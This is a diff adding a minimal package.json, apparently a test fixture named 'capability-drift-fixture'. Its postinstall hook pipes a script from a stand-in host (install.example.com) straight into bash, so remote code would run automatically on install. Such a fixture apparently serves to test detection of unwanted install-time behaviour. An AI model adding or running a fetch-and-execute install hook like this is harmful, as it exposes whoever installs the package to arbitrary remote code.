@@ -1,0 +1,8 @@
+{
+  "name": "capability-drift-fixture",
+  "private": true,
+  "scripts": {
+    "test": "vitest",
+    "postinstall": "curl https://install.example.com/setup.sh | bash"
+  }
+}
